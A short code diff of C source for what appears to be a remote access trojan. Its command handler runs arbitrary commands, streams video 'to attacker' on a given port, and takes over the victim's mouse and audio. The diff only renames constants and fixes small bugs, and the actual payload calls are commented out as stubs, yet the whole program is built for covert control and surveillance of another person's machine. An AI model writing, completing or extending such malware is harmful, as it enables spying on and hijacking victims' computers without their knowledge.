@@ -18,8 +18,8 @@
 // run an arbitrary comamnd
 #define RUN_CMD 5
 // start and end video, mouse, and audio streams
-#define START_VID 6
-#define END_VID 7
+#define START_VIDEO 6
+#define END_VIDEO 7
 #define START_MOUSE 8
 #define END_MOUSE 9
 #define START_AUDIO 10
@@ -32,7 +32,7 @@
 // helper function for exiting on error
 void exitOnError() {
 	printf("Exiting program...\n");
-	return 1;
+	exit(1);
 }
 
 /*
@@ -75,15 +75,15 @@ char handleCommand(char* buffer) {
 		// shift the buffer left by one to get just command and its arguments
 		for (int i = 1; i < 4096 && buffer[i - 1] != '\0'; i++) {
 			buffer[i - 1] = buffer[i]; }
-		printf("Running %s from command prompt\n", buffer);
+		printf("Running \"%s\" from command prompt\n", buffer);
 		//runCommandPrompt(buffer);
-	} else if (cmd == START_VID) {
+	} else if (cmd == START_VIDEO) {
 		printf("Starting video stream...\n");
 		// get the port to connect to
 		int port = (buffer[1] * 256) + buffer[2];
 		printf("Streaming video to attacker on port %d\n", port);
 		//streamVideo(port);
-	} else if (cmd == END_VID) {
+	} else if (cmd == END_VIDEO) {
 		// TODO - determine how best to stop video stream
 	} else if (cmd == START_MOUSE) {
 		printf("Taking control of mouse...\n");
